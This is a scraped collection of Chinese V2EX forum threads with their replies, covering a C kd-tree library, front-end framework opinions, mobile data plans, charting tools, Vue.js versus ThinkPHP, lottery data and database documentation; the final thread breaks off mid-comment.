{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/begeekmyfriend/kdtree\" rel=\"nofollow\">https://github.com/begeekmyfriend/kdtree</a>\r<br>\r<br>特点：绝对平衡，搜索极快，代价是动态性差，每次增删后需要重建。\r<br>\r<br>实现是对增删进行缓存，直到重建才映射到实际数据结构中去。重建会对每个维度分量进行快速排序，以确保每个树节点都是取中值，实现了绝对平衡，也即最小高度，最大限度降低搜索比较次数，杜绝最差情况发生。\r<br>\r<br>注意，排序只是对数据样本的索引进行移动，数据本身插入时只拷贝一次，数据样本集中缓存有利于 cache 命中。\r<br>\r<br>有兴趣欢迎探讨。</div>"], "reply": "4", "tittle": "kNN 算法的 kd 树实现（ C 源码）", "comment": ["我是第一个赞的，楼主的 C 代码看起来很舒服。", "大佬", "除了「 for(; ;)」和「 8 個空格縮進」屬於口味不同以外，樓主的代碼簡直是一股清流……", "正规军"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>个人不是很喜欢目前这类 MVVM 框架（个人认为要改革也要类似 Elm 这种一体化的语言）</p>\n<p>但是大家好像都对这类框架很着迷</p>\n<p>所以发帖看看自己是不是已经是个异类了</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>第一页大概有6,7个人明确表示不是很喜欢这类框架。</p>\n<p>看来大部分人还是</p>\n<ol>\n<li>挺喜欢这类框架</li>\n<li>碰到的业务需求都是需要这类框架才搞的定</li>\n<li>面向工资编程而学习使用的</li>\n</ol>\n</div></div>"], "reply": "140", "tittle": "我就弱弱的问问，有多少人不喜欢 vue， react 这类框架的？", "comment": ["React + Redux 就很好", " #2 「可替代性太高了。于是就得搞点东西刷存在感。」\r", "\r", "不知道是哪个项目让你有这样的感觉", "看一些回复也是搞笑，既然这些框架能提高生产率为什么不用呢，黑人问号？", " \r", "\r", "我和你的想法非常类似 \r", "我希望的是，保留一些自己习惯性的开发方式，能应对以后的不同问题，可以沿用尽可能长的时间。\r", "\r", "其实比较偏向于比较传统的语言的开发库形式\r", "\r", "有的老程序员，他自己构建的库用了十多年，还一如既往在使用维护。\r", "\r", "这些价值感觉才是无价的，对得起自己十多年的积累。", " 一些中小企业用这种 简直不能太棒\r", "现在很多公司就是明明没有几个人访问的站点 硬是搞 7788 的 各种大框架啊什么的 然后一大堆遗留问题又处理不了", " 是啊", " 面向工资编程，只争朝夕。\r", "\r", "1 年前风风火火的 react native ，现在入坑上当的不也都积极寻找替代方案吗", "  你是没见过被 Angular 这个坑的不要不要的公司，\r", "然后找上我出解决方案。我免费给他们一次了解决方案。。至今执行不了，到的答复是我们觉得影响不是很大不是很有特点\r", "- -！", " 我们公司在用 ClojureScript", " 是的。感谢你的赞同。我的答案的初衷其实是想强调新东西学习成本。有些新框架学习起来不容易，况且更替很快。在我看来真没必要。如果说前端是在不断进化，那么我觉得更有必要思考下目前业务逻辑需要哪些功能，是否需要引入一些新东西，而不是盲目的使用“进化”产物。这里进化是打引号的。是否真的在进化，而不是重复造轮子？我都保持怀疑。轮子只是工具，业务和需求才是核心啊。", " \r", "\r", "是的，而且所谓的“进化”，一开始看上去很简洁美。现在想想呢？\r", "react 和 vue 都各自加了一些插件来解决它们自己引发的问题。\r", "有的传统架构没有的问题，在它们这里，需要开发一个专门的插件项目来解决。", "这评论区真是醉了。。。\r", "也就 @", " @", " @SuperMild @sunber  等少数几个人好好思考过了\r", "===\r", "剩下的那些「不搞复杂点，就会被后端取代呀」「扯预编译器的」说话真的过脑子了么", "变的太快所以不学，你们还是 21 世纪的么？", "vanilla.js 也在变， ES6 、 7 也别学了", " 从我进一个公司一下午就可以代替一个两三年的人，感觉出来的。", " #115 那是人的问题吧", " 他也没说错，前端这东西经验都是解决方案，没有壁垒，每一次大的革新时被年轻力壮的新人取代很正常，因为过去的解决方案毫无用处了。", "说用 Elm 的，先撸个可用的项目来看看", " 我走了，下一个人也可以一下午取代我。   我说的是前端岗位没有深度的问题，每个前端都差不多。都在追新", " #117 所以呢？你的意思是用 Java 是因为学了以后就算不用再 upgrade 自己也不会被淘汰的意思？", " #119 做什么项目都有浅有深啊。我要是写 Android, 然后下一个人接手也能一下午取代我，那是因为 Java 的问题？一个技术有没有深度是用这种方式来衡量的？", "、。。", " 请问啥公司", " 安卓也有这个问题。   有些岗位就不是这样。\r", "比如腾讯做消息处理的后台开发、一些公司的项目经理。没有两周是上不了手的。\r", "前端岗位的可替代性非常强。", " 确实由于某些原因可替代性非常强，所以大家也怕，都要争先恐后学习新技术\r", "\r", "不过国内的前端工资不少，也算聊以慰藉。", "另外，我认为不喜欢学习的程序员，才是面向工资编程的吧。", " \r", "\r", "其实主要矛盾是学什么，计算机领域有很多东西，有的东西是金子，经得起时间考验，有的东西是铜铁，经不起时间考验。\r", "\r", "每个人都希望自己学习的东西是金子，这点总没错吧。", "我就不爱用 redux ， 好多时候只要 pub 一个数据到目标组件，不需要进 store 的也要进去绕一圈。而且 redux 把组件功能的显示部分(viewer)和数据操作部分(reducer)拆开了。反而不利于组件化。 \r", "\r", "用 React 和 jquery 等一起用，各取所长用起来比较爽。 toastr,alertify 这种全局组件之类的用传统的就很方便，反而是用 react 硬凹的 toast 很难用。\r", "\r", "jQuery 组件因为常常会绑定到全局 dom,所以常见的用法是 Page(A 组件， B 组件, C 组件)\r", "React 组件的因为没有全局绑定，所以比较容易干出 Page(A 组件（ B 组件（ C 组件， D 组件)）），复杂的组件可以不断分解为简单的组件。各个击破。", " #127 你见过哪一个领域的金子是某一种框架或者库吗", " 有啊 LLVM 就是。。。", " 大部分框架或者库都不是金子，所以不想花时间学 react vue 这种啊。。", "其实这个问题可以引申到其他语言的各种框架。\r", "我的感觉和前面同学说的一样，用框架可以，但是如果只会用框架，可替代性太强。\r", "举个例子。。。 java 的 spring 太强大了。一下午的时间和 3 年只是用框架的人从业务实现来看完全一样，甚至还更高，因为新学所以看的是新的文档。\r", "lz 举完全是雷同的。现在是能不用框架不用框架。。我宁愿自己撸。真省了很多时间吗？除了一些特别复杂的需求。其实很简单几行代码就能搞定。。网上大把的片段能 copy 。。理解不能框架对于个人到底带来的是什么。恩，更多的是懒惰。。。。还有自大。会用几个框架就觉得自己特别牛逼。其实市场上大把的雷同，随时可替代。这也是互联网公司 leader 的阴毛", " atlassian", " \r", "confluence 有个功能是类似 google doc 一样的多人协作\r", "前端是 ClojureScript 写的，后端是 Clojure 的", " 好公司，是在国内还是在澳洲？\r", "\r", "PS ：能不能帮催一下， SourceTree 啥时候出 Linux 下的版本？在线等，急～～～", " STL 都多少年了， Boost 不知不觉也 10 多年了吧， Spring 也挺坚挺的，很多东西金子说不上，但好歹保值\r", "\r", "想起天国的 RoR 。", " 澳洲， linux 版没有计划😂😂😂", "无论是什么框架，重点是怎么规划代码， react+redux 一样写出可维护性低、屎一样的代码，用 jquery 写，搞搞工具类库，一样写出好代码。但是我很反感动不动就鼓吹 vue ， react 。", " 全栈 Clojure, 赞赞赞", "开始不是很喜欢，但是公司业务使用了这个后，用着用着就喜欢了，方便省事。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>坐标四川，待在家里闷太久了看到代码就烦，想去公园里面呼吸一下新鲜空气，伴随着绿意和鸟声写代码应该会时时保持新意和充沛的精力，就是在外联网太麻烦，如果有一张 4G 无限流量的上网卡就好了，如果真不行， V2 们推荐一下有没有什么相对流量多而且便宜的流量套餐？</p>\n</div></div>"], "reply": "163", "tittle": "有没有那种无限流量的上网卡，我想去公园里面写代码？", "comment": ["有，但是超一定容量之后速度奇慢", " 电信限制一个月最多 24G ，达到后自动关闭上网功能，坐标深圳。。。", "北京电信有 3G 无限流量卡。\r", "\r", "不过我也认为写代码用不了多少流量", "你确定，你的电量够吗？？", "以前 3G 时代有 3 分卡 5 分卡（每分钟 3/5 分钱），不限流量，下载速度大约 150kb/s 。\r", "现在似乎没有了。", "蚊子多。。。。。。。。。。。。", "雲南這邊聯通有七彩無限流量套餐", "想写代码就应该断网，", "你应该去公园休闲够了再回来写代码\r", "\r", "不然你两边都做不好", "我现在用的是上海移动至尊卡， 100 元 /月 40G ，不得不说，是真的用不完。", "某宝搜冰激凌联通或者当地的日租卡！！", "直播平台上，那些做户外直播的。他们是流量消耗大户，可以跟他们打听一下。", "蚂蚁宝卡。", "用电信日租卡是一种不错的选择， 800M/1 块，性价比最高。\r", "买个二手的紫米 mf855 也就两百，现在可以设定日流量限制。日租卡每月费用也就三十几块。", "广东联通好像有 118 包月无限流量， 40G 后切 3G ， x00G 后断网", "写代码用不了多少流量吧……", "写代码需要多少流量？……每个月有一多半的时间都在 KFC 用流量写代码， 3G 的流量， 4G 卡，毫无流量压力，用不完……", "没人提 SSR 混淆么。。。。", " 请问你说的具体是什么卡？我非常有兴趣", " 空中卡出嘛？", "成都？新鲜空气？", "去公园？还不如去咖啡厅", "联通冰淇淋卡， 199/月，全国无限流量", "写代码需要多少流量呀，难道你是面向搜索引擎编程？一个月 10GB 够吗？", "我一个月 4g 流量根本用不光，要什么无限流量", "应该不是每天都去公园吧？可以去的时候就买一个流量日租包，广东这边 5 元 1G", " 武侯祠有 wifi     [斜眼]", " +1", "楼主用 Win 的话 自动更新啥的肯定需要大流量呀", "电信 189 套餐， 100M 宽带 + 无限流量", " \r", " \r", "\r", "为什么上海没有日租卡啊？？？", "冰淇淋卡，联通的，只能新入网办理。", " 哪个城市？", "我竟无言以对。。。", "去咖啡厅或者断网写代码。。说不定更能 focus", "写个代码要多少流量，热点就够了\r", "不是下载各种包啥的话", "厦门表示 长时间非必要目的性暴露在户外 冬天=冷风吹 现在=淋成狗 热天=晒成炭 为什么和自己过不去。", "蚊子多啊，你会后悔的，还是咖啡馆比较好，或者便宜的农家乐也可以。", "感觉敲代码还是叫上三五好友，在一个安静的地方，比如某个人的家里或者一个周六日的公司等等，这样心情会比在户外嘈杂的车声，咖啡店的吵闹声里的心情好太多。", "带上苹果本,去公园,写好代码,保存在本地.到家了在提交代码呗", "有心写代码，哪里都能静心写代码\r", "\r", "好吧，走题了", "我写代码不挑地方，只挑时间，一个星期总有那么 6 、 7 天不想写代码。。。", "支付宝 京东上的那些虚拟运营商的卡都挺便宜的", "四川的水边我是彻底怕了，每次都被蠓（超小的飞虫）咬，然后几个月奇痒无比，一直用糖皮质激素（地塞米松、可的松）才会逐步缓解，一个包需要半年以上才好。", "有。参见我这个帖子 ", "\r", "之前是北京才能用，现在全国大部分地区都可以用了，包括四川省。", "可以看看你们当地的联通电信的校园套餐，我联通 36 月租 40 多 G 省内流量", "上海移动， 100 块 40GB", "  一个月流量费满打满算两百块钱，让我为了省这个去偷东西？", "就成都这天，这空气质量，公园全是老年坝坝舞，十几个音箱对着耳机，你确定这地方能写代码？", "这种日租卡的退出机制是什么？到了月底不交钱就行了？现在网上买来的可都是实名了的。", "广场舞的笑喷\r", "\r", "写累了，一起跳吧", " 你哪个地方的？", "现在部分公园的厕所附近有 chinanet ，可以试试看，淘宝买一日账号就一块钱不到", "免流的那几个端口", "难道不是应该先问笔记本备用电源？", " 空中卡好是好，不过只能用 3G 模式，要是能 4G 就好了", "去找个 cafe 写代码不错", "写代码外接键盘的怎么办？", "有些地方有移动和电信的公共 wifi ，买个账号就可以连了。", "你如果只是写代码，一个月能用 1G 么？如果看视频，又能写多少代码？少年，我的建议是，先去一次，然后再说流量卡的事，好么？否则，你永远都走不出去。。因为你还要考虑坐哪里，拿不拿伞，喝什么水，带什么水杯，怎么上厕所之类的一系列问题。。。。走出去，才是第一步，然后坐在那里，来 v2 问流量卡的事，好么？", "北京电信磅礴卡， 46/月，前 2G 流量是 4G 的网速，超过 2G 后，速度降为 3G ，无限制使用，其实速度还是蛮快的。只希望全国都能普及这种套餐！", "北京表示 公园一冷 二雾霾大\r", "关键问题是 电不够啊", "我觉得这不是个好主意，主要在于天气不好的时候不想去，天气好的时候公园一般都是虐狗集中地更不能去了！"]},
{"content": ["<div class=\"topic_content\">想做一个图表页面，数据动态更新，初步考虑数据定时生成 json 文件，方便缓存，前后端可以分离。\r<br>vue 很流行，图表想用 highchart 试试，数据方便没想好，除了 mysql 保存时间序列类数据还适合用啥？\r<br>项目是朋友一起做的，一半使用，一半想练手，只是想做的漂亮些。</div>"], "reply": "17", "tittle": "想做一个监控类的图表动态更新页面，有啥轮子可以复用？", "comment": ["目前用 Echarts ，要相信国产的会更好的", "一直用 HighCharts 的路过。。 ", " 动态更新的话应该是 Ajax 监控后端数据变化吧？", "时间序列数据，可用 influxdb", "参考下 grafana , 先前一直想用 D3.js , 后来发现 D3 直接写还是要求很高的。有很多基于 D3 的好项目， LZ 可以找找看。", "用过 highcharts+websocket 实现动态更新。用 addpoint 就好了", " influxdb 非常优秀，一直在用，另外也可以考虑 Elasticsearch", " ElasticSearch 做时间序列数据存储时，需要配置下 mapping ，关闭 all 和 source ，操作稍微复杂些，不能“开箱即用”；不过好处是可以分布式、多副本", " 是的， influxdb 做到了开箱即用。\r", "influxdb 的“定义”了时序数据库。 Elasticsearch “定义”了搜索。\r", "实际应用要看项目需求去搭配，各有擅长的领域，但也有交集，所以 grafana 才同时支持这两种类型的 datasource （他们各自还有个应用堆栈： TICK 和 ELK ）", "百度 echarts", "我记得不久前，可能是十几个小时前有个 V 友就造了 Vue2.0 ＋某 charts 的轮子。\r", "可惜我竟然找不到了，找不到了…… Google 大法都不管用，估计还没被收录。\r", "（借楼一用，搭车问一下，那个帖子的地址，我仿佛是失忆了，后悔当时没及时点开帖子看内容）", " 国产的是好，使用略复杂，也是看了 v2 朋友的反馈，用 highchart 比较全面。偷懒。\r", " js 刷新获取数据，还是很方便的，后端生成 js 数据。\r", " 谢谢，也在纠结要不要尝试 influxdb ，毕竟还有些数据库需要保存， mysql 恐怕也少不了。涉及 2 种以上的数据库，要不要试试呢。。。\r", " 谢谢， grafana 先收藏着，以后慢慢看。\r", " websocket 是个新思路，一直想的简单，直接刷新呢，数据少，效率上还顶的住。\r", " Elasticsearch 比较重，目前感觉没必要上。数据是一方面，图表还是想漂亮点，能自己控制比较好。", "我想存储的是心跳，体温等健康数据， influxdb 是否能永久保存，是否需要再存一份在 mysql 中？", "influxdb 据说很好用，单机很快。我们用的 opentsdb 集群，感觉专用的时间序列数据库在使用上还是更加方便的，尤其应对复杂查询的时候，可以少造很多轮子。\r", "\r", "凡是叫做 db 的东西，持久化都是没问题的，不用考虑 mysql 了我感觉。", "感觉动态数据方面， highcharts 比 echarts 的数据结构更清晰", " \r", " 这个吧？", "用 Vue + ECharts 的话，可以试试我这个： ", " 应该不是这个，我记得是用 Vue2.0 做的\r", "可能是这个 ", "\r", " 你的也不错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从知乎转过来的，你们觉得这个问题该怎么回答</p>\n<p>虽然这两个框架一个是前端一个是后端，但是都是国产开源项目，还是略有可比性把</p>\n<p><a href=\"https://www.zhihu.com/question/56106082\" rel=\"nofollow\">https://www.zhihu.com/question/56106082</a></p>\n<p>（2017-02-21 15:34:37：好像知乎服务器又提了一个问题，断断续续无法访问，你们可以晚点再看看）</p>\n</div></div>"], "reply": "88", "tittle": "同为国产框架的 Vue.js 和 ThinkPHP 为何在国内外口碑和评价差距那么大？", "comment": ["深度用过这两个开源项目后就很清楚了吧。", "vue 至少有些人用的爽， tp 真有用的爽的么？", "与框架设计思路、代码质量有关", "vue 是在 taylor 和 jeff 在 laravel 中使用后才火的，与国内没什么关系", "tp 是真心不好用，深度封装，封装过头了", "其实没别的原因，也没什么好洗地的，真实实力确实有影响但是只是一方面， Vue 作者 Google 出来的，会英文，长得比 thinkphp 作者帅甚至是官网都比 thinkphp 好看，这足够么？对比之下 thinkphp 就显得各方面都很屌丝，别忽略这些看起来“边缘”的东西，真的还就是这样的， avalon 其实早期各方面也没差 vue 多少", "vue 是硅谷的产物啊, 不能算\"国产\"吧", "产品基因区别很明显吧。何况 Vue.js 在英语世界的推广也是很用力且在点子上的。", "> 都是国产开源项目，还是略有可比性把\r", "\r", "除了都是中国人这一点，其它没有相同的地方...", "打开官网首页就知道有啥区别了。。。", "为啥 tp 和 vue 的口碑并列了……\r", "\r", "tp 的口碑和国产没啥关系,毕竟 Yii 的作者也是国人，没见口碑这么差。", " 你错了， vue 出来的时候在国外根本没有人用，作者在国内疯狂宣传，然后搭上了这两年国内前端人员井喷，纷纷去 github star ，老外一看这是什么项目怎么这么火也才开始稍微有点火", " 幸好我知道实情不然我真的信了", "对着两个东西都不是特别熟，但是在问题里看见一句『难道仅仅是因为没有英文文档的原因吗？』\r", "\r", "……这还不够么……\r", "你看到一个项目或者框架是俄语或者德语的文档你的第一反应难道是 Google translate 么……", "vue 赶上了 react 的顺风车……刚出来的时候，有谁想过用。", " 哈哈哈快抖出来", "vue..... .... 什么时候变国产啦？？？", "大概是 thinkphp 没有英文文档？", "vue 好像不算是国产的", " yii 的作者听说是美国国籍？而且从 yii 的推广策略来看， yii 根本没有考虑过中国市场，毕竟连官网上都没有可选中文开发文档，对比 vue.js ， vue 官网至少还有中文选项。", "时势造英雄", " 为什么不信， ", " 3 年前我看了作者的科普文章就在内部项目里用过 vue 了，作者的宣传手法也很简单，利用人对大公司著名项目的崇拜之情来宣传自己，这些又不是什么黑历史，你翻作者以前的微博都是利用自己谷歌出身+larvaral 社区来宣传的\r", "\r", "ps: 人有了名气，脾气也大了，现在你让作者写个 vue 这样的中文科普文章介绍 vue2 ，他会把你喷出翔", " \r", "\r", "> 利用人对大公司著名项目的崇拜之情，这些又不是什么黑历史\r", "\r", "谁说是黑历史，本来就是常见又正常的推广方式\r", "\r", "> 你翻作者以前的微博都是利用自己谷歌出身+larvaral 社区来宣传的\r", "\r", "这没什么问题啊\r", "\r", "> 人有了名气，脾气也大了\r", "\r", "你指的是什么， yyx 喷过谁?\r", "\r", "> 现在你让作者写个 vue 这样的中文科普文章介绍 vue2 ，他会把你喷出翔\r", "\r", "不然该称赞吗 🤧 你让我写我也不干啊..", " #22 这个很正常吧， redux 作者之前也有亲自录的 redux 教学视频", "这是 vue.js 被黑得最惨的一次（和啥 thinkphp 比较啊）", "除了都是国产都是框架还有什么可比性么。。。咱和新八呱还都同是国产同是人了。。咋没人给咱续命。。", "因为一个是在 Github 上使用英语为主要语言的，自然很多人以为是国外的，自然圆一点啦", " 这个本身没问题我不齿的是他在火前火后，对待中文社区的态度", "vue 算国产？中文文档看着跟特么机翻的一样……", "只要你想问题时考虑了作者是哪里人，基本你就 low 了。技术这东西还看出处吗？", "thinkphp == 政治不正确", "用过了就知道了， php 我通常只用 slim3", " +1", "为什么同为国产就有可比性了，难不成以后用个框架还得看哪国程序员写的", "本来不怎么了解 php 的，打开官网看了下。。。我了个去。。。", " \r", "\r", "看了你的回复我也搜了下。\r", "\r", "特地去 github 看了下到底是不是官网……", "所以还有什么理由认为不喜欢 ThinkPHP 是因为它是国产？", " 嗯，同感，看英文更流畅一点", "vue 算国产吗。。", "我觉得 vue 根本不能算国产..\r", "你觉得尤雨溪在国内环境能写出来么", "我又想 at 看云了", "最关键是尤雨溪的国际背景，当初写 vue 的时候在 google 工作，英文文档写的比中文都易懂。", "去年接触过 vue.js ，当时 2.0 刚出，官网没有中文文档，只有英文文档。然后加了一个 vue.js 的翻译 qq 群。。", " #44 233333 笑出声", "前后端框架有可比性么？", "我来黑 Vue.js ，看看有木有接受不了的。一个精简版前端框架，凭什么跟一个模版网站做对比。怒了 ThinkPHP 作者就把 web 界面改用 Vue.js 套上就可以了。", " 你是在黑 thinkphp 吗 😂", "那些拿微博说事的是不是不看作者 twitter..拿个不太合适的类比，杨振宁李政道的成就是国产吗？都是在国外上学国外工作做出来的吧。", "其实 Vue 最大的助攻是 Laravel 啊，人家也是 PHP 框架，官方教程什么的直接就钦定 Vue 了。好的文档加其他框架的助攻，加上自己戳中了一部分人的痛点，比什么大公司背景啊 github star 啊这些管用，那些虚的东西撑不了这么远，只能最开始闹闹，最重要的还是文档和社区。\r", "\r", "Vue 在 reddit 和 hacker news 这种群众很挑剔的地方口碑也还不错，只靠那些虚的东西早就被喷成翔了（ react 这种真大公司背景的就经常被黑公司光环严重）。而且好像也没在这些地方看到过人拿作者的中国背景和 Google 工作经验说事..（大概是上面 Googler 或者 ex-Googler 太多没啥好说）", "慧眼识英雄。（看人，你说啥就是啥。）啊哈哈", "开源插件这种东西还要强调侧重哪国市场？", " 其实我很疑惑的是，如果用 vue 做 spa 的话，那 laravel 的作用就剩写 api 了，完全体现不出 php 花式拼页面的效率了。岂不是被抢了风头。\r", "就算不写 spa 的话， vue 的组件 data 还是用 ajax 获取比较优雅吧， laravel 仍然是写 api 不用拼页面了。所以这俩组合不觉得尴尬吗？", " \r", "\r", "恰恰相反， laravel 的优势并不是拼页面，反而对拼页面有不少掣肘，只提供 api 的话，它的整个流水线似乎就是为了做 api 而设计的", "  还真不是， 15 年的时候前端社区已经慢慢的开始推荐 vue 了，我也是那时候接触 vue 的", "呵呵 国外的月亮比国内圆系列！每个人有每个人的使用习惯 你用不惯不代表不好 也没必要去喷！ low", " php 的初衷不是互交数据然后花式拼 html 返回给浏览器的吗？假如是只写用 php 写 api 的话，用轻量级框架是不是比 laravel 要来的舒服。比如 lumen slim ，或者 golang 。而且我看过很多 laravel+vue 都是把前端打包弄到后端的目录里，其实一个 nginx 指向前端的生产目录不就好了吗？后端的项目独立开，就是写 api 。", " 作为后端送你两个字~呵呵", " 因为不理解嘛，又是 spa ，又是组合 laravel 的。所以大神你讲讲，别呵呵呀。", " \r", "\r", "是的，这是 php 的初衷，但是已经没多少人还记得 php 自己就是模板语言了。", "== Vue 啥时候成国产了...avalon 才算国产吧...", " \r", "\r", "如果真是后端没啥好呵呵的。\r", "\r", "除非你只会 php 。\r", "\r", "用不同的语言处理不同的问题是一个程序员的基本素养。", " 哎，我不配作为一个程序员。。", " 不不不……如果 Vue 没出来，我就考虑自己造一个 Vue 了……", " \r", "\r", "有自知之明是件好事", " \r", "\r", "作为一个程序员，至少要有 3 门拿得出手吧……", " 拿的出手指的是什么程度呢？如果是 clone 一个 V2EX ， cnode 出来， node ， python ， php 都可以，但是说往里面深了的话就不懂了，主业前端，平时也没什么时间用，都是大学里玩玩的，现在除了 node 还有接触，其他的基本上没摸过了，我也就仅限于 curd 的程度吧", " \r", "\r", "其实说实话吧，现在现代语言就是三个编程语言范式杂糅，基本上就语法糖不一样的问题了。比如，你能拿 nodejs 写一个 Web 框架，那么你拿 Python / Ruby 等只需要学习基本的语法就能同样造一个。就像我拿 VimScript 一样能造一个 JSON 解析器，虽然我就接触过 VimScript 没多久……\r", "\r", "所以更多是领域问题，而不是语言问题。所以语言是非常容易学而且非常低价值的……当然，除了我大 Haskell 外 /w\\", "  但是很显然 @", "  说的关于\r", "> 用不同的语言处理不同的问题是一个程序员的基本素养\r", "就是语言+领域问题啊，所以我确实这方面不符合一个程序员的基本素养（苦笑摊手）", " \r", "\r", "我这句话有两个点\r", "\r", "1.不同语言\r", "\r", "2 不同(领域)问题\r", "\r", "\r", "看来你觉得 1 不是问题，那么就是 2 的问题。\r", "\r", "假设哪怕你的工作只专注于一个领域，那么你工作领域之外的部分都不会想到用程序去解决。这还算什么程序员？\r", "\r", "你是前端，所以你连维护自己系统的脚本都不会写？\r", "\r", "如果你是后端，所以你连一个备份 /迁移 /导入导出的程序都不会写？\r", "\r", "如果你喜欢拍照，要整理分析照片的时候用脚本爬 exif 都不会写？\r", "\r", "如果你觉得你只在工作需要的那个领域写代码，那你的确不算程序员，最多是个流水线工人而已。", "  嗯，流水线工人回去一定好好学习，谢谢大神指点", "使用 TP 的感受：我有句妈卖批不知当讲不当讲\r", "使用 Vue.js 的感受：爽爽爽爽爽爽\r", "\r", "大概就是这样的区别", "6 、 7 年前。。。第一次接触 PHP 好像就是撸的 think php 。。当时也没啥感觉马马虎虎啊。╮(╯▽╰)╭，为啥被黑的这么惨哈哈~", " 是的，最近看 twig 的文档，才知道一开始 PHP 就是一门模板语言。", " \r", "\r", "你的确可以好好学习了。\r", "\r", "不然也不会不怕 tj 精分的说什么 express vs koa 是大而全 vs 小而美了\r", "\r", "也不会说什么 php 官方手册但疼了。\r", "\r", "更不会说什么 800 一天不低了。", " 呵呵。这有什么问题？我不觉得这是黑料啊，你把这些东西挖坟出来是想说明什么？", " \r", "\r", "这不是黑料？呵呵。\r", "\r", "挖坟？呵呵。要不要我把这些帖子的发布时间列出来？\r", "\r", "既然你喜欢说些不阴不样的话，我就把话挑明。\r", "\r", "说的出 express 和 koa 的的问题，足见你压根不了解 Nodejs 的常见框架和历史。更不知道 tj 这个 nodejs 开源框架里贡献极大又一度生成退出 nodejs 开发的重要人物。但你依然敢来评论。\r", "\r", "说 php 官方手册蛋疼，说明你压根过没好好看多少手册，没有好好学习过几个语言，框架，甚至开源库。\r", "\r", "这两个问题说明你就是喜欢不管清楚不清楚了解不了解没事装个 B 。\r", "\r", "在这个帖子里也是这样。一个热门贴只有你盯着一点上，也不想想是不是自己的问题。\r", "\r", "至于第三点，其实就是结果。\r", "\r", "我上网从来就不是为了顾忌别人的感受的，既然你一定喜欢找不自在，我不介意成全你。", "发现一只 node collaborator", " Slim 棒！", "vue 不是个框架啊", " @", " 我不是大神，一个后端菜鸟，我只是想说后端没有想象那么简单，没有恶意", " \r", "\r", "你都没有明白别人在说什么……\r", "\r", "别人只是说 laravel 是比较重的框架，如果只是 api+mvvm 的话，用更轻量级的 silm 之类的框架更适合。\r", "\r", "后端没那么简单，也没那么复杂。\r", "\r", "复杂的地方在构架和业务，语言框架并不是重点。", "呵呵，逼格问题。", "不是 一个 js 框架 一个 PHP 框架 怎么有可比性 ? 我是没看懂你这问题", "js team vs php team ？", "想到 ThinkPHP 的作者也看 V2EX ，几乎隔几天就能看到一次对 TP 的大规模讨伐。\r", "如果我是作者，我的心真是太累了。\r", "其实单就「学习成本」这方面来看， TP 确实有着很大的优势。\r", "\r", "PHP 在语言鄙视链的末端， TP 又处于 PHP 内部鄙视链的末端。\r", "鄙视链一环接着一环，站在鄙视链上无休止的讨论，多么浪费生命啊…", " 精辟，忍不住点个赞", "对前端不是很了解，妄言之。\r", "\r", "大家都是吃技术这碗饭的，对其中的技术含量稍微了解就有倾向了。\r", "Vue 关键在于与时俱进啊，学习 Angular 大量优点， React 出现后迅速推出 Vue2 ，还有 Redux 和 Vuex 。。。\r", "而 ThinkPHP 不思进取，当初在和 Codeigniter 的竞争从技术角度来说没有优势，和现在流行的 Laravel ， Symfony 更是差远了。\r", "两者作为国产框架，都享受到加成，但是一个锦上添花，一个扶不起的阿斗罢了。\r", "\r", "举个例子，有点像华为和酷派，两者当年同为中华酷联之一，现在的处境感受下。"]},
{"content": ["<div class=\"topic_content\">分享一下晚上爬的数据\r<br>链接: <a target=\"_blank\" href=\"http://pan.baidu.com/s/1jIfsjuI\" rel=\"nofollow\">http://pan.baidu.com/s/1jIfsjuI</a> 密码: zwja\r<br>\r<br>我晓得用历史数据推双色球必须输成狗。。但是，可以拿来干什么好玩的？</div>"], "reply": "23", "tittle": "爬了一份双色球的数据，可以拿来干什么？", "comment": ["随机数。。", "卖给彩民呗，大数据妥妥的。", " 文件在这里 百度的可能吞掉。。", "用 stat 的知识做一个 plot", "做个彩票网站", "无聊做一下分析，看是不是随机的……", "1 、打印成纸条，藏在身上\r", "2 、研发时间机器", "手头东西少，现取了 100 个第一位。。 mean =4.86 standard deviation=3.909 经计算，取 c-level 为 0.5 ，推荐买(2.223,7.497)中间的数\r", "（感觉在废话", "我决定做一个这样的系统放朋友圈  朋友利用邮箱注册以后 系统每一期按照一个算法（用户可选）推送一个选号给朋友 然后我也记录每次推送的号码 发现谁中奖了 如果他中奖了就找他给红包 没有中就算了 但是 中了他却没有买 我就要折磨他了 233333", " 好主意", " 高深", "现在很多 1 元购拿的都是这类数据辅助计算结果得吧", "tensor flow", "\r", "这就有一份啊。", "生成了一份随机数，可以用来干什么", "等你穿越你就发了呀", "基本上没有什么用处！", "可以发到百度盘上分享给别人", "比如我告诉你下一期中奖号是  5,10,14,17,27,30,12  然后你没买，然后中奖了。你特别后悔。你坐时光机回去，买了这个号，然后开奖的时候却不是这个号，你就郁闷了，原因我相信有人会懂的。", " 我为什么觉得不是蝴蝶效应呢...", " 啊 难道是去了平行空间", " 双色球出奖结果是人工控制的", "机器学习，预测彩票"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>数据库设计的文档，目前用的 PowerDesigner ，但是太重了，而且将这个迁移到 git 之后，也没法对比修改的东西，用什么比较轻便，最好可以 git 能对比出来差异的</p>\n</div></div>"], "reply": "10", "tittle": "数据库设计的文档，用什么比较合适？", "comment": ["难道不是直接用建库的 SQL 源码加注释？我觉得这个才是最好用的啊", " 如果想表达一些主外键关系呢？", " 比如某一个表示状态的，用的 tinyint ,本来 1 到 10 表示的各种状态，突然增加了一个 11 ，表示新的状态，数据有 1000 万，你告诉我要改表？", " sql 里所有的表，过程，函数，约束都是可以用源码表达的，源码加合理的注释我真觉得没有什么不可以表达的， PowerDesigner 这种搞设计图的用来展示的居多，用来做文档并不好用，而且 sql 其实是一种结构化的描述语言，本身就很适合做文档——给程序员看的文档", " 我不懂你的意思，你们的业务变了，需要表示的数据增加新的值，原来的列类型不符合要求了，你不改表怎么办？ 1000w 数据很多吗？你见过几亿数据的表，维护时改结构跑几个小时的吗？", " 大哥，不是类型不符合要求了，是刚开始创建的时候，写的注释只有 1 到 10 的中文解释，现在只是增加了个 11 ，你就要改表，开玩笑呢，你改个表，让网站停半天，仓库停半天，客服停半天", " 我看了半天我终于看明白你的意思了，你的意思是从表结构上直接看注释对吗？我说的注释是写在 sql 文件里的，并不要求线上的 mysql 数据库的注释和 sql 源码里的百分百一样，以 sql 